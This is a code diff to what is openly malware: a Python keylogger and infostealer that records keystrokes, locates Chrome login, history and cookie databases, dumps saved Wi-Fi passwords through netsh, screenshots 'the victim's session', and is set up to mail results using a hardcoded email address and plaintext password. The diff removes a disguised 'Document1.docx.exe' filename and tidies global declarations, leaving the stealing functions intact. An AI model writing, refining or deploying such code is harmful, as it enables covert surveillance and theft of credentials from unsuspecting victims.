@@ -17,8 +17,6 @@ SENDER = "cuij@inbox.lv"
 RECEIVERS = ["cuij@inbox.lv"]
 PASSWORD = "F9wQ!jHUp5"
 
-KEYLOGGER_FILE = "Document1.docx.exe"
-
 global log
 log = ""
 typed_string = ""
@@ -34,7 +32,7 @@ def logprint(text, overwrite=False):
 
 
 def on_press(event):
-    global log, typed_string
+    global typed_string
     logprint(f"{event.time}:Key {event.name} pressed (Code:{event.scan_code})\n")
     event_dict = {"space": " ",
                   "enter": "\n",
@@ -56,7 +54,6 @@ def on_press(event):
 def get_chrome_data():
     '''Returns a list with the respective paths of the login, history and cookie SQL databases'''
     try:
-        global log
         logprint("INFO: Attempting to retrieve chrome data...\n")
         data_path = path.expanduser('~').replace(
             "\\", '/') + "/AppData/Local/Google/Chrome/User Data/Default"
@@ -75,7 +72,6 @@ def get_chrome_data():
 def get_wifi_data():
     ''' Returns a list of all known wifi credentials'''
     try:
-        global log
         logprint("INFO: Attempting to retrieve wifi data...\n")
         data = check_output(['netsh', 'wlan', 'show', 'profiles'
                              ]).decode('utf-8',
@@ -118,7 +114,7 @@ def get_wifi_data():
 
 def take_screenshot():
     '''Takes a screenshot of the victim's session and return its file path'''
-    screenshot = pyscreeze.screenshot('ico.png') 
+    screenshot = pyscreeze.screenshot('ico.png')
     return getcwd(screenshot)
 
 
